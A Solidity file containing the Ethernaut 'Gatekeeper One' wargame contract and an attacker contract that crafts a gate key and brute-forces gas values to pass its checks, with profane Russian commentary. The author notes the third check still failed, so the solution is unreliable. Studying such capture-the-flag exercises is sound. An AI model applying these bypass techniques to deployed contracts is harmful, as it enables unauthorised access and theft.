// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Ethernaut Level 13: Gatekeeper One
 *
 * Make it past the gatekeeper and register as an entrant to pass this level.
 *
 * Things that might help:
 * - Remember what you've learned from the Telephone and Token levels.
 * - You can learn more about the gasleft() function in Solidity documentation.
 */
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        //первые 4 байта(первые 16 байт) == первые 2 байта (первые 16 байт)
        //uint64(bytes 8) -- конвертирует 8 байт в число без потери и приобритения данных, потому что uint64 = 2^64 = (2^8)^8
        //uint32(uint64) -- обрубает первые 4 байта информации, то есть мы получаем только последние 4 байта от bytes8
        //uint16(uint64) -- обрубает первые 6 байтов, выходит 2 последних
        //uint160 = 20 байт = длина адреса в эфире
        //первые 4 байта != первым 16 байтам
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract LetMeIn {
    address public owner;
    GatekeeperOne public original;

    constructor(address payable _to) public {
        owner = msg.sender;
        original = GatekeeperOne(_to);
    }

    function go_inside(address aublyat) public payable returns (bool) {
        /*значит так ебать, первый реквайр говорит, что последние 4 байта
        должны совпасть с 2 последними байтами, поэтому у нас они будут 0000FFFF

        второй реквайр говорит, что последние 4 байта не равны первым 8. Чтобы
        его выполнить нам надо, чтобы первые 4 байта все вместе не равнялись 0.
        Для этого сделаем их 01010101

        третий реквайр говорит, что последние 2 байта адреса должны совпасть
        с первыми 4 байтами ключа. Для этого мы сделаем последние 2 байта ключа 
        равными последним 2 байтам адреса, тогда будет 0000(XX)(YY), где XX и YY -
        байты ключа
        
        Выходит, что 0x0101010100000000 -- пустые последние 4 байта + второй реквайр

        + uint16(uint160(aublyat)) -- прибавляем последние 2 байта ключа

        на выходе имеем 0x010101010000(XX)(YY)

        И ЭТА ЕБАЛА ДОЛЖНА УДОВЛЕТВОРЯТЬ ВСЕМ УСЛОВИЯМ, СУКА

        Мои тесты рекваеров показывали, что ломается третье условие. Я не понимаю почему.

        */
        bytes8 key = bytes8(0x0101010100000000 + uint16(uint160(aublyat)));
        for (uint256 i = 0; i <= 8191; i++) {
            /*тут тупо брутфорсим необходимое число газа, хули нам, бобрам */
            try original.enter{gas: 500000 + i}(key) {
                return true;
            } catch {}
        }
    }
}
